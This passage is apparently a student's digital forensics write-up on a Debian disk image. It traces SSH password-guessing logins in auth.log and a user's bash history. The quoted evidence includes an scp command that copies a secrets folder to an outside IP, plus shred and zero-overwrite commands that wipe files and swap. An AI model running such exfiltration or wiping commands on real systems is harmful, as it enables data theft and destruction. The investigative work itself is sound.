/images/sda1/home/jake/.bash_history
</pre>
</div>

<p>
Look at jake&rsquo;s bash history
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 45: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/home/jake/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 46: </span>Results</label><pre class="src src-text">cp -r /secrets .
ls
scp -r secrets d000d@207.92.30.41   :~/
ls
mv secrets .elinks
ls
ls -alh
</pre>
</div>

<p>
Look at SSH known_hosts
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 47: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/home/jake/.ssh/known_hosts
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 48: </span>Results</label><pre class="src src-text">tastytronic.net,64.81.40.132 ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAIEA4yJ4d2f42iIwGP8LrIAxP1sfPUZCWJATVPAOhLtT7BBvseJg55PGGXRenlvjLgRWFlfT4pCyyX5GN5wHV9aLr5Qh7iFOtz9ZHaDvdkq8dD0ZxdVxfX1lH3eTECuWwwaQtcV0zLQZ5dShPIuJxM0MgaYub/wRrPPc186vmf1B9cE=
</pre>
</div>

<p>
(tastytronic.net seems to be a company/blog space for authors to this assignment.)
</p>


<p>
look into jakes .elinks
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 49: </span>Commands</label><pre class="src src-sh">sudo ls -lRa /images/sda1/home/jake/.elinks
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 50: </span>Results</label><pre class="src src-text">/images/sda1/home/jake/.elinks:
total 16
drwxr-x--- 4 1006 1006 4096 2007-09-10 04:23 .
drwxr-xr-x 4 1006 1006 4096 2007-09-10 04:26 ..
drwxr-x--- 2 1006 1006 4096 2007-09-10 04:23 numbers
drwxr-x--- 2 1006 1006 4096 2007-09-10 04:23 other

/images/sda1/home/jake/.elinks/numbers:
total 552
drwxr-x--- 2 1006 1006 4096 2007-09-10 04:23 .
drwxr-x--- 4 1006 1006 4096 2007-09-10 04:23 ..
-rw-r----- 1 1006 1006 6212 2007-09-10 04:23 100.csv
-rw-r----- 1 1006 1006  721 2007-09-10 04:23 10.csv
-rw-r----- 1 1006 1006  782 2007-09-10 04:23 11.csv
-rw-r----- 1 1006 1006  843 2007-09-10 04:23 12.csv
-rw-r----- 1 1006 1006  904 2007-09-10 04:23 13.csv
-rw-r----- 1 1006 1006  965 2007-09-10 04:23 14.csv
-rw-r----- 1 1006 1006 1026 2007-09-10 04:23 15.csv
-rw-r----- 1 1006 1006 1087 2007-09-10 04:23 16.csv
-rw-r----- 1 1006 1006 1148 2007-09-10 04:23 17.csv
-rw-r----- 1 1006 1006 1209 2007-09-10 04:23 18.csv
-rw-r----- 1 1006 1006 1270 2007-09-10 04:23 19.csv
-rw-r----- 1 1006 1006  171 2007-09-10 04:23 1.csv
-rw-r----- 1 1006 1006 1331 2007-09-10 04:23 20.csv
-rw-r----- 1 1006 1006 1392 2007-09-10 04:23 21.csv
-rw-r----- 1 1006 1006 1453 2007-09-10 04:23 22.csv
-rw-r----- 1 1006 1006 1514 2007-09-10 04:23 23.csv
-rw-r----- 1 1006 1006 1575 2007-09-10 04:23 24.csv
-rw-r----- 1 1006 1006 1636 2007-09-10 04:23 25.csv
-rw-r----- 1 1006 1006 1697 2007-09-10 04:23 26.csv
-rw-r----- 1 1006 1006 1758 2007-09-10 04:23 27.csv
-rw-r----- 1 1006 1006 1819 2007-09-10 04:23 28.csv
-rw-r----- 1 1006 1006 1880 2007-09-10 04:23 29.csv
-rw-r----- 1 1006 1006  232 2007-09-10 04:23 2.csv
-rw-r----- 1 1006 1006 1941 2007-09-10 04:23 30.csv
-rw-r----- 1 1006 1006 2002 2007-09-10 04:23 31.csv
-rw-r----- 1 1006 1006 2063 2007-09-10 04:23 32.csv
-rw-r----- 1 1006 1006 2124 2007-09-10 04:23 33.csv
-rw-r----- 1 1006 1006 2185 2007-09-10 04:23 34.csv
-rw-r----- 1 1006 1006 2246 2007-09-10 04:23 35.csv
-rw-r----- 1 1006 1006 2307 2007-09-10 04:23 36.csv
-rw-r----- 1 1006 1006 2368 2007-09-10 04:23 37.csv
-rw-r----- 1 1006 1006 2429 2007-09-10 04:23 38.csv
-rw-r----- 1 1006 1006 2490 2007-09-10 04:23 39.csv
-rw-r----- 1 1006 1006  293 2007-09-10 04:23 3.csv
-rw-r----- 1 1006 1006 2551 2007-09-10 04:23 40.csv
-rw-r----- 1 1006 1006 2612 2007-09-10 04:23 41.csv
-rw-r----- 1 1006 1006 2673 2007-09-10 04:23 42.csv
-rw-r----- 1 1006 1006 2734 2007-09-10 04:23 43.csv
-rw-r----- 1 1006 1006 2795 2007-09-10 04:23 44.csv
-rw-r----- 1 1006 1006 2856 2007-09-10 04:23 45.csv
-rw-r----- 1 1006 1006 2917 2007-09-10 04:23 46.csv
-rw-r----- 1 1006 1006 2978 2007-09-10 04:23 47.csv
-rw-r----- 1 1006 1006 3039 2007-09-10 04:23 48.csv
-rw-r----- 1 1006 1006 3100 2007-09-10 04:23 49.csv
-rw-r----- 1 1006 1006  354 2007-09-10 04:23 4.csv
-rw-r----- 1 1006 1006 3161 2007-09-10 04:23 50.csv
-rw-r----- 1 1006 1006 3222 2007-09-10 04:23 51.csv
-rw-r----- 1 1006 1006 3283 2007-09-10 04:23 52.csv
-rw-r----- 1 1006 1006 3344 2007-09-10 04:23 53.csv
-rw-r----- 1 1006 1006 3405 2007-09-10 04:23 54.csv
-rw-r----- 1 1006 1006 3466 2007-09-10 04:23 55.csv
-rw-r----- 1 1006 1006 3527 2007-09-10 04:23 56.csv
-rw-r----- 1 1006 1006 3588 2007-09-10 04:23 57.csv
-rw-r----- 1 1006 1006 3649 2007-09-10 04:23 58.csv
-rw-r----- 1 1006 1006 3710 2007-09-10 04:23 59.csv
-rw-r----- 1 1006 1006  415 2007-09-10 04:23 5.csv
-rw-r----- 1 1006 1006 3771 2007-09-10 04:23 60.csv
-rw-r----- 1 1006 1006 3832 2007-09-10 04:23 61.csv
-rw-r----- 1 1006 1006 3893 2007-09-10 04:23 62.csv
-rw-r----- 1 1006 1006 3954 2007-09-10 04:23 63.csv
-rw-r----- 1 1006 1006 4015 2007-09-10 04:23 64.csv
-rw-r----- 1 1006 1006 4076 2007-09-10 04:23 65.csv
-rw-r----- 1 1006 1006 4137 2007-09-10 04:23 66.csv
-rw-r----- 1 1006 1006 4198 2007-09-10 04:23 67.csv
-rw-r----- 1 1006 1006 4259 2007-09-10 04:23 68.csv
-rw-r----- 1 1006 1006 4320 2007-09-10 04:23 69.csv
-rw-r----- 1 1006 1006  476 2007-09-10 04:23 6.csv
-rw-r----- 1 1006 1006 4381 2007-09-10 04:23 70.csv
-rw-r----- 1 1006 1006 4442 2007-09-10 04:23 71.csv
-rw-r----- 1 1006 1006 4503 2007-09-10 04:23 72.csv
-rw-r----- 1 1006 1006 4564 2007-09-10 04:23 73.csv
-rw-r----- 1 1006 1006 4625 2007-09-10 04:23 74.csv
-rw-r----- 1 1006 1006 4686 2007-09-10 04:23 75.csv
-rw-r----- 1 1006 1006 4747 2007-09-10 04:23 76.csv
-rw-r----- 1 1006 1006 4808 2007-09-10 04:23 77.csv
-rw-r----- 1 1006 1006 4869 2007-09-10 04:23 78.csv
-rw-r----- 1 1006 1006 4930 2007-09-10 04:23 79.csv
-rw-r----- 1 1006 1006  537 2007-09-10 04:23 7.csv
-rw-r----- 1 1006 1006 4991 2007-09-10 04:23 80.csv
-rw-r----- 1 1006 1006 5052 2007-09-10 04:23 81.csv
-rw-r----- 1 1006 1006 5113 2007-09-10 04:23 82.csv
-rw-r----- 1 1006 1006 5174 2007-09-10 04:23 83.csv
-rw-r----- 1 1006 1006 5235 2007-09-10 04:23 84.csv
-rw-r----- 1 1006 1006 5296 2007-09-10 04:23 85.csv
-rw-r----- 1 1006 1006 5357 2007-09-10 04:23 86.csv
-rw-r----- 1 1006 1006 5418 2007-09-10 04:23 87.csv
-rw-r----- 1 1006 1006 5479 2007-09-10 04:23 88.csv
-rw-r----- 1 1006 1006 5540 2007-09-10 04:23 89.csv
-rw-r----- 1 1006 1006  598 2007-09-10 04:23 8.csv
-rw-r----- 1 1006 1006 5601 2007-09-10 04:23 90.csv
-rw-r----- 1 1006 1006 5662 2007-09-10 04:23 91.csv
-rw-r----- 1 1006 1006 5723 2007-09-10 04:23 92.csv
-rw-r----- 1 1006 1006 5784 2007-09-10 04:23 93.csv
-rw-r----- 1 1006 1006 5845 2007-09-10 04:23 94.csv
-rw-r----- 1 1006 1006 5906 2007-09-10 04:23 95.csv
-rw-r----- 1 1006 1006 5967 2007-09-10 04:23 96.csv
-rw-r----- 1 1006 1006 6028 2007-09-10 04:23 97.csv
-rw-r----- 1 1006 1006 6089 2007-09-10 04:23 98.csv
-rw-r----- 1 1006 1006 6150 2007-09-10 04:23 99.csv
-rw-r----- 1 1006 1006  659 2007-09-10 04:23 9.csv
-rw-r----- 1 1006 1006   45 2007-09-10 04:23 NOTICE

/images/sda1/home/jake/.elinks/other:
total 52
drwxr-x--- 2 1006 1006  4096 2007-09-10 04:23 .
drwxr-x--- 4 1006 1006  4096 2007-09-10 04:23 ..
-rw-r--r-- 1 1006 1006 20480 2007-09-10 04:23 newsecret.data
-rw-r----- 1 1006 1006  4096 2007-09-10 04:23 secret2.data
-rw-r----- 1 1006 1006 16384 2007-09-10 04:23 secret3.data
-rw-r----- 1 1006 1006  2048 2007-09-10 04:23 secret.data
</pre>
</div>

<p>
Diff jakes .elinks with the secret folder.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 51: </span>Commands</label><pre class="src src-sh">sudo diff -rq /images/sda1/secrets /images/sda1/home/jake/.elinks
</pre>
</div>

<p>
As we get no output the direcotries are the same.
</p>
</div>
</div>

<div id="outline-container-orgce52825" class="outline-4">
<h4 id="orgce52825"><span class="section-number-4">4.2.16</span> Root account</h4>
<div class="outline-text-4" id="text-4-2-16">
<p>
Look at the root home dirs.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 52: </span>Commands</label><pre class="src src-sh">sudo find /images/sda1/root/ -maxdepth 2 -name <span style="color: #CC9393;">"*"</span>
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 53: </span>Results</label><pre class="src src-text">/images/sda1/root/
/images/sda1/root/.bash_history
/images/sda1/root/.profile
/images/sda1/root/.bashrc
/images/sda1/root/.ssh
/images/sda1/root/.ssh/known_hosts
</pre>
</div>

<p>
Look at root&rsquo;s bash history
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 54: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/root/.bash_history
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 55: </span>Results</label><pre class="src src-text">ls
cd secret/
ls
which shred
mv secrets /secrets
vi motd
vi /etc/motd
ls
vi motd
date
cat motd  &gt;&gt; /etc/motd
cat /etc/motd
ls
shred -u -z *
ls
cd ..
rmdir secret/
ls
cd /secrets/
ls
cd ..
ls -alh
addgroup secretive
sudo adduser fred
adduser fred
adduser mike
adduser jane
chfn jane
adduser bill
sudo vi /etc/group
vi /etc/group
adduser guest
adduser guest
cd /
ls
chown root:secretive -R secrets/
ls -alh
chmod g+rwx secrets
ls -alh
sudo chmod g+s secrets
chmod g+s secrets
ls -alh
ls -alh secrets/
ls -alh secrets/numbers/
ls
swapon -s
swapoff /dev/hda2
hexedit
apt-get install hexedit
cat /dev/zero &gt; /dev/hda2
mkswap /dev/hda2
swapon -a
ls /home/
tail -f /var/log/auth.log
vi /etc/group
chmod o-rwx -R /secrets
cat /dev/zero &gt; file
rm file
cd /secrets/
ls
ls -alh
chmod g+w numbers/
chmod g+w other
ls
adduser jake
cat /etc/group
vi /etc/group
ssh jake@localhost
whoami
rm -rf ~mike/john-1.7.2*
</pre>
</div>
</div>
</div>

<div id="outline-container-org5a40087" class="outline-4">
<h4 id="org5a40087"><span class="section-number-4">4.2.17</span> Look for the IP provided.</h4>
<div class="outline-text-4" id="text-4-2-17">
<p>
Look in users home.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 56: </span>Commands</label><pre class="src src-sh">sudo grep -rnw /images/sda1/home/ -e <span style="color: #CC9393;">"207.92.30.41"</span> 2&gt; /dev/null
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 57: </span>Results</label><pre class="src src-text">/images/sda1/home/jake/.bash_history:3:scp -r secrets d000d@207.92.30.41   :~/
</pre>
</div>

<p>
Look in the /var.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 58: </span>Commands</label><pre class="src src-sh">sudo grep -rnw /images/sda1/var/ -e <span style="color: #CC9393;">"207.92.30.41"</span> 2&gt; /dev/null
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 59: </span>Results</label><pre class="src src-text">
</pre>
</div>

<p>
Look in /etc
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 60: </span>Commands</label><pre class="src src-sh">sudo grep -rnw /images/sda1/etc/ -e <span style="color: #CC9393;">"207.92.30.41"</span> 2&gt; /dev/null
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 61: </span>Results</label><pre class="src src-text">
</pre>
</div>
</div>
</div>

<div id="outline-container-org3b29b07" class="outline-4">
<h4 id="org3b29b07"><span class="section-number-4">4.2.18</span> Look for log files</h4>
<div class="outline-text-4" id="text-4-2-18">
<p>
List log files
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 62: </span>Commands</label><pre class="src src-sh">ls -R /images/sda1/var/log | <span style="color: #CC9393;">\</span>
awk <span style="color: #CC9393;">'/:$/&amp;&amp;f{s=$0;f=0} /:$/&amp;&amp;!f{sub(/:$/,"");s=$0;f=1;next} NF&amp;&amp;f{ print s"/"$0 }'</span> | <span style="color: #CC9393;">\</span>
sort
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 63: </span>Results</label><pre class="src src-text">/images/sda1/var/log/auth.log
/images/sda1/var/log/daemon.log
/images/sda1/var/log/debug
/images/sda1/var/log/dmesg
/images/sda1/var/log/exim
/images/sda1/var/log/faillog
/images/sda1/var/log/installer.log
/images/sda1/var/log/installer.timings
/images/sda1/var/log/kern.log
/images/sda1/var/log/ksymoops
/images/sda1/var/log/ksymoops/20070909.log
/images/sda1/var/log/ksymoops/20070910025202.ksyms
/images/sda1/var/log/ksymoops/20070910025202.modules
/images/sda1/var/log/ksymoops/20070910025214.ksyms
/images/sda1/var/log/ksymoops/20070910025214.modules
/images/sda1/var/log/ksymoops/20070910025617.ksyms
/images/sda1/var/log/ksymoops/20070910025617.modules
/images/sda1/var/log/ksymoops/20070910043141.ksyms
/images/sda1/var/log/ksymoops/20070910043141.modules
/images/sda1/var/log/ksymoops/20070910.log
/images/sda1/var/log/lastlog
/images/sda1/var/log/lp-acct
/images/sda1/var/log/lp-errs
/images/sda1/var/log/lpr.log
/images/sda1/var/log/mail.err
/images/sda1/var/log/mail.info
/images/sda1/var/log/mail.log
/images/sda1/var/log/mail.warn
/images/sda1/var/log/messages
/images/sda1/var/log/news
/images/sda1/var/log/news/news.crit
/images/sda1/var/log/news/news.err
/images/sda1/var/log/news/news.notice
/images/sda1/var/log/syslog
/images/sda1/var/log/user.log
/images/sda1/var/log/uucp.log
/images/sda1/var/log/wtmp
</pre>
</div>

<p>
auth.log
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 64: </span>Commands</label><pre class="src src-sh">sudo cat /images/sda1/var/log/auth.log
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 65: </span>Results</label><pre class="src src-text">Feb 8 02:53:01 yoyodyne PAM_unix[244]: (cron) session opened for user mail by (uid=0)
Feb 8 02:53:02 yoyodyne PAM_unix[244]: (cron) session closed for user mail
Sep 10 10:38:01 yoyodyne PAM_unix[2207]: (cron) session closed for user mail
Sep 10 10:53:01 yoyodyne PAM_unix[2211]: (cron) session opened for user mail by (uid=0)
Sep 10 10:53:01 yoyodyne PAM_unix[2211]: (cron) session closed for user mail
Sep 10 03:56:38 yoyodyne sshd[2214]: Could not reverse map address 193.252.122.103.
Sep 10 03:56:41 yoyodyne PAM_unix[2214]: authentication failure; (uid=0) -&gt; john for ssh service
Sep 10 03:56:43 yoyodyne sshd[2214]: Failed password for john from 193.252.122.103 port 33018 ssh2
Sep 10 03:56:50 yoyodyne last message repeated 2 times
Sep 10 03:56:50 yoyodyne PAM_unix[2214]: 2 more authentication failures; (uid=0) -&gt; john for ssh service
Sep 10 03:57:24 yoyodyne sshd[2216]: Could not reverse map address 193.252.122.103.
Sep 10 03:57:36 yoyodyne PAM_unix[2216]: authentication failure; (uid=0) -&gt; fred for ssh service
Sep 10 03:57:38 yoyodyne sshd[2216]: Failed password for fred from 193.252.122.103 port 33019 ssh2
Sep 10 03:57:58 yoyodyne last message repeated 2 times
Sep 10 03:57:58 yoyodyne PAM_unix[2216]: 2 more authentication failures; (uid=0) -&gt; fred for ssh service
Sep 10 03:58:18 yoyodyne sshd[2219]: Could not reverse map address 193.252.122.103.
Sep 10 03:58:41 yoyodyne sshd[2221]: Could not reverse map address 193.252.122.103.
Sep 10 03:59:01 yoyodyne sshd[2223]: Could not reverse map address 193.252.122.103.
Sep 10 03:59:26 yoyodyne sshd[2225]: Could not reverse map address 193.252.122.103.
Sep 10 03:59:42 yoyodyne sshd[2227]: Could not reverse map address 193.252.122.103.
Sep 10 03:59:45 yoyodyne PAM_unix[2227]: authentication failure; (uid=0) -&gt; mike for ssh service
Sep 10 03:59:47 yoyodyne sshd[2227]: Failed password for mike from 193.252.122.103 port 57719 ssh2
Sep 10 03:59:55 yoyodyne last message repeated 2 times
Sep 10 03:59:55 yoyodyne PAM_unix[2227]: 2 more authentication failures; (uid=0) -&gt; mike for ssh service
Sep 10 04:00:14 yoyodyne sshd[2229]: Could not reverse map address 193.252.122.103.
Sep 10 04:00:15 yoyodyne sshd[2229]: Accepted password for mike from 193.252.122.103 port 57720 ssh2
Sep 10 04:00:15 yoyodyne PAM_unix[2231]: (ssh) session opened for user mike by (uid=1002)
Sep 10 04:00:57 yoyodyne PAM_unix[2110]: (ssh) session closed for user root
Sep 10 04:00:57 yoyodyne sshd[2110]: PAM pam_putenv: delete non-existent entry; MAIL
Sep 10 04:01:02 yoyodyne PAM_unix[2231]: (ssh) session closed for user mike
Sep 10 04:01:02 yoyodyne sshd[2231]: PAM pam_putenv: delete non-existent entry; MAIL
Sep 10 04:01:09 yoyodyne sshd[2235]: Could not reverse map address 193.252.122.103.
Sep 10 04:01:20 yoyodyne sshd[2237]: Could not reverse map address 193.252.122.103.
Sep 10 04:01:29 yoyodyne sshd[2237]: Accepted password for fred from 193.252.122.103 port 57722 ssh2
Sep 10 04:01:29 yoyodyne PAM_unix[2239]: (ssh) session opened for user fred by (uid=1001)
Sep 10 04:01:48 yoyodyne sshd[2235]: Accepted password for root from 193.252.122.103 port 57721 ssh2
Sep 10 04:01:48 yoyodyne PAM_unix[2235]: (ssh) session opened for user root by (uid=0)
Sep 10 04:03:02 yoyodyne PAM_unix[2239]: (ssh) session closed for user fred
Sep 10 04:03:02 yoyodyne sshd[2239]: PAM pam_putenv: delete non-existent entry; MAIL
Sep 10 04:03:21 yoyodyne sshd[2251]: Could not reverse map address 193.252.122.103.
Sep 10 04:03:26 yoyodyne sshd[2251]: Accepted password for jane from 193.252.122.103 port 57726 ssh2
Sep 10 04:03:26 yoyodyne PAM_unix[2253]: (ssh) session opened for user jane by (uid=1003)
Sep 10 04:03:54 yoyodyne PAM_unix[2253]: (ssh) session closed for user jane
Sep 10 04:03:54 yoyodyne sshd[2253]: PAM pam_putenv: delete non-existent entry; MAIL
Sep 10 04:04:08 yoyodyne sshd[2258]: Could not reverse map address 193.252.122.103.
Sep 10 04:04:11 yoyodyne sshd[2258]: Accepted password for mike from 193.252.122.103 port 34667 ssh2
Sep 10 04:04:12 yoyodyne PAM_unix[2260]: (ssh) session opened for user mike by (uid=1002)
Sep 10 04:04:59 yoyodyne PAM_unix[2266]: authentication failure; mike(uid=1002) -&gt; root for su service
Sep 10 04:05:02 yoyodyne su[2266]: pam_authenticate: Authentication failure
Sep 10 04:05:02 yoyodyne su[2266]: - pts/0 mike-root
Sep 10 11:08:01 yoyodyne PAM_unix[2277]: (cron) session opened for user mail by (uid=0)
Sep 10 11:08:01 yoyodyne PAM_unix[2277]: (cron) session closed for user mail
Sep 10 04:08:10 yoyodyne PAM_unix[2260]: (ssh) session closed for user mike
Sep 10 04:08:10 yoyodyne sshd[2260]: PAM pam_putenv: delete non-existent entry; MAIL
Sep 10 04:08:21 yoyodyne sshd[2280]: Could not reverse map address 193.252.122.103.
Sep 10 04:08:23 yoyodyne sshd[2280]: Accepted password for mike from 193.252.122.103 port 34672 ssh2
Sep 10 04:08:23 yoyodyne PAM_unix[2282]: (ssh) session opened for user mike by (uid=1002)
Sep 10 04:17:10 yoyodyne PAM_unix[2235]: (ssh) session closed for user root
Sep 10 04:17:10 yoyodyne sshd[2235]: PAM pam_putenv: delete non-existent entry; MAIL
Sep 10 04:17:24 yoyodyne sshd[2626]: Could not reverse map address 193.252.122.103.
Sep 10 04:17:31 yoyodyne sshd[2626]: Accepted password for jane from 193.252.122.103 port 55072 ssh2
Sep 10 04:17:31 yoyodyne PAM_unix[2628]: (ssh) session opened for user jane by (uid=1003)
Sep 10 04:18:36 yoyodyne sshd[2635]: Could not reverse map address 193.252.122.103.
Sep 10 04:18:40 yoyodyne sshd[2635]: Accepted password for root from 193.252.122.103 port 55075 ssh2
Sep 10 04:18:40 yoyodyne PAM_unix[2635]: (ssh) session opened for user root by (uid=0)
Sep 10 04:19:19 yoyodyne PAM_unix[2628]: (ssh) session closed for user jane
Sep 10 04:19:19 yoyodyne sshd[2628]: PAM pam_putenv: delete non-existent entry; MAIL
Sep 10 04:20:26 yoyodyne PAM_unix[2635]: (ssh) session closed for user root
Sep 10 04:20:26 yoyodyne sshd[2635]: PAM pam_putenv: delete non-existent entry; MAIL
Sep 10 04:20:33 yoyodyne su[2650]: + pts/0 mike-root
Sep 10 04:20:33 yoyodyne PAM_unix[2650]: (su) session opened for user root by mike(uid=1002)
Sep 10 04:21:05 yoyodyne groupadd[2654]: new group: name=jake, gid=1006
Sep 10 04:21:05 yoyodyne useradd[2655]: new user: name=jake, uid=1006, gid=1006, home=/home/jake, shell=/bin/bash
Sep 10 04:21:21 yoyodyne PAM_unix[2658]: Password for jake was changed
Sep 10 04:21:51 yoyodyne chfn[2659]: changed user `jake' information.
Sep 10 04:22:17 yoyodyne chfn[2660]: changed user `jake' information.
Sep 10 11:23:01 yoyodyne PAM_unix[2663]: (cron) session opened for user mail by (uid=0)
Sep 10 11:23:01 yoyodyne PAM_unix[2663]: (cron) session closed for user mail
Sep 10 04:23:15 yoyodyne sshd[2666]: Accepted password for jake from 127.0.0.1 port 1028 ssh2
Sep 10 04:23:15 yoyodyne PAM_unix[2668]: (ssh) session opened for user jake by (uid=1006)
Sep 10 04:26:24 yoyodyne PAM_unix[2668]: (ssh) session closed for user jake
Sep 10 04:26:24 yoyodyne sshd[2668]: PAM pam_putenv: delete non-existent entry; MAIL
Sep 10 04:28:11 yoyodyne PAM_unix[2282]: (ssh) session closed for user mike
Sep 10 04:28:11 yoyodyne sshd[2282]: PAM pam_putenv: delete non-existent entry; MAIL
Sep 10 04:28:51 yoyodyne sshd[1963]: Received signal 15; terminating.
Sep 10 04:31:53 yoyodyne sshd[197]: Server listening on 0.0.0.0 port 22.
Sep 10 04:32:26 yoyodyne PAM_unix[206]: (login) session opened for user root by LOGIN(uid=0)
Sep 10 04:32:27 yoyodyne login[206]: ROOT LOGIN on `tty1'
Sep 10 04:32:40 yoyodyne sshd[197]: Received signal 15; terminating.
</pre>
</div>


<p>
Look for entris from the IP address 193.252.122.103
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 66: </span>Commands</label><pre class="src src-sh">sudo grep -rnw /images/sda1/var/log/ -e <span style="color: #CC9393;">"193.252.122.103"</span> 2&gt; /dev/null
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 67: </span>Results</label><pre class="src src-text">/images/sda1/var/log/auth.log:6:Sep 10 03:56:38 yoyodyne sshd[2214]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:8:Sep 10 03:56:43 yoyodyne sshd[2214]: Failed password for john from 193.252.122.103 port 33018 ssh2
/images/sda1/var/log/auth.log:11:Sep 10 03:57:24 yoyodyne sshd[2216]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:13:Sep 10 03:57:38 yoyodyne sshd[2216]: Failed password for fred from 193.252.122.103 port 33019 ssh2
/images/sda1/var/log/auth.log:16:Sep 10 03:58:18 yoyodyne sshd[2219]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:17:Sep 10 03:58:41 yoyodyne sshd[2221]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:18:Sep 10 03:59:01 yoyodyne sshd[2223]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:19:Sep 10 03:59:26 yoyodyne sshd[2225]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:20:Sep 10 03:59:42 yoyodyne sshd[2227]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:22:Sep 10 03:59:47 yoyodyne sshd[2227]: Failed password for mike from 193.252.122.103 port 57719 ssh2
/images/sda1/var/log/auth.log:25:Sep 10 04:00:14 yoyodyne sshd[2229]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:26:Sep 10 04:00:15 yoyodyne sshd[2229]: Accepted password for mike from 193.252.122.103 port 57720 ssh2
/images/sda1/var/log/auth.log:32:Sep 10 04:01:09 yoyodyne sshd[2235]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:33:Sep 10 04:01:20 yoyodyne sshd[2237]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:34:Sep 10 04:01:29 yoyodyne sshd[2237]: Accepted password for fred from 193.252.122.103 port 57722 ssh2
/images/sda1/var/log/auth.log:36:Sep 10 04:01:48 yoyodyne sshd[2235]: Accepted password for root from 193.252.122.103 port 57721 ssh2
/images/sda1/var/log/auth.log:40:Sep 10 04:03:21 yoyodyne sshd[2251]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:41:Sep 10 04:03:26 yoyodyne sshd[2251]: Accepted password for jane from 193.252.122.103 port 57726 ssh2
/images/sda1/var/log/auth.log:45:Sep 10 04:04:08 yoyodyne sshd[2258]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:46:Sep 10 04:04:11 yoyodyne sshd[2258]: Accepted password for mike from 193.252.122.103 port 34667 ssh2
/images/sda1/var/log/auth.log:55:Sep 10 04:08:21 yoyodyne sshd[2280]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:56:Sep 10 04:08:23 yoyodyne sshd[2280]: Accepted password for mike from 193.252.122.103 port 34672 ssh2
/images/sda1/var/log/auth.log:60:Sep 10 04:17:24 yoyodyne sshd[2626]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:61:Sep 10 04:17:31 yoyodyne sshd[2626]: Accepted password for jane from 193.252.122.103 port 55072 ssh2
/images/sda1/var/log/auth.log:63:Sep 10 04:18:36 yoyodyne sshd[2635]: Could not reverse map address 193.252.122.103.
/images/sda1/var/log/auth.log:64:Sep 10 04:18:40 yoyodyne sshd[2635]: Accepted password for root from 193.252.122.103 port 55075 ssh2
</pre>
</div>
</div>
</div>

<div id="outline-container-org57249cd" class="outline-4">
<h4 id="org57249cd"><span class="section-number-4">4.2.19</span> Motd</h4>
<div class="outline-text-4" id="text-4-2-19">
<p>
Look at the welcome SSH message
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 68: </span>Commands</label><pre class="src src-sh">cat /images/sda1/etc/motd
</pre>
</div>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 69: </span>Results</label><pre class="src src-text">Linux yoyodyne 2.2.20-idepci #1 Sat Apr 20 12:45:19 EST 2002 i686 unknown

Most of the programs included with the Debian GNU/Linux system are
freely redistributable; the exact distribution terms for each program
are described in the individual files in /usr/share/doc/*/copyright

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
---------------------------------------------------------------------
                 NOTICE AND CONSENT LOG-ON BANNER

This is a YOYODYNE DEFENSE computer system.  This computer system,
including all related equipment, networks and network devices
(specifically including internet access), are provided only for
authorized YOYODYNE use.  YOYODYNE computer systems may be monitored for
all lawful purposes, including to ensure that their use is authorized,
for management of the system, to facilitate protection against
unauthorized access, and to verify security procedures, survivability
and operational security.  Monitoring includes active attacks by
authorized YOYODYNE entities to test or verify the security of this
system.  During monitoring, information may be examined, recorded,
copied and used for authorized purposes.  All information, including
personal information, placed on or sent over this system may be
monitored.  Use of this YOYODYNE computer system, authorized or
unauthorized, constitutes consent to monitoring of this system.
Unauthorized use may subject you to criminal prosecution.  Evidence of
unauthorized use collected during monitoring may be used for
administrative, criminal or other adverse action.  use of this system
constitutes consent to monitoring for these purposes.
---------------------------------------------------------------------
</pre>
</div>
</div>
</div>

<div id="outline-container-orgab0c33b" class="outline-4">
